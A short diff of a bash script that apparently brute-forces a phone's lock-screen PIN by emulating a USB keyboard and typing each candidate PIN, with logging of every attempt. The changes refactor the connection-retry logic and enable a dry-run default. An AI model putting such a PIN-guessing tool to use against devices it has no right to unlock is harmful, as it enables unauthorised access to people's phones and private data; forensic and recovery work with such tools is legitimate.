@@ -14,9 +14,8 @@ source config
 
 
 VERSION=0.1
-DATE_COMMAND="date +%b%d_%r"
-
-DRY_RUN=0
+DRY_RUN=1
+VERBOSE=0
 
 # Operating System Environment
 KEYBOARD_DEVICE=/dev/hidg0
@@ -147,21 +146,12 @@ do
   send_esc
   send_enter
 
-  # check connection to phone
-  fail_counter=0
-  while [ $RET != 0 ]; do
-    log_fail "HID USB device not ready. $HID_KEYBOARD returned $RET." 
-    sleep 2
-    send_enter
-    ((fail_counter++))
+  # if we got an error from sending the key, check the phone connection
+  if [ $RET -gt 0 ]; then
+    monitor_phone_connection
+  fi
 
-    if [[ $fail_counter -gt $EXIT_AFTER_FAIL_COUNT ]]; then
-      log_fail "Exiting after $EXIT_AFTER_FAIL_COUNT successive failures."
-      abort
-    fi
-  done
-
-  echo "[+] $($DATE_COMMAND) $count: Trying $pin" | tee -a "$LOG"
+  echo "[SEND] $pin. Attempt $count at $(date +"%b%d %r")" | tee -a "$LOG"
   for i in `echo "$pin" | grep -o .`; do
     send_key $i
   done 
